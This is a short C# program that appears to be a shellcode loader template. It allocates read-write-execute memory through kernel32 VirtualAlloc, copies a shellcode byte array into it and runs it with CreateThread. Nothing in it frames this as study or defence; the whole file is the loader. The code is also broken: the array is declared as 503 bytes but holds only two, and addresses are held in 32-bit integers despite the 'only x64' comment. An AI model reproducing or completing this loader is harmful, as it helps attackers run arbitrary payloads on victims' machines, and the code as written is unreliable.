//only x64 !!!

using System;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;

public class Program {

    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    public static void Main()
    {

        //only x64
        byte[] shellcode = new byte[503] {0x48,0x36};


        UIntPtr bytesWritten = UIntPtr.Zero;
        uint shellcode_size = (uint)shellcode.Length;
        uint lpThreadId = 0;


        uint codeAddr = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)codeAddr, (int)shellcode_size);
        IntPtr threadHandle = CreateThread(0, 0, codeAddr, IntPtr.Zero, 0, ref lpThreadId);

        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
    }
}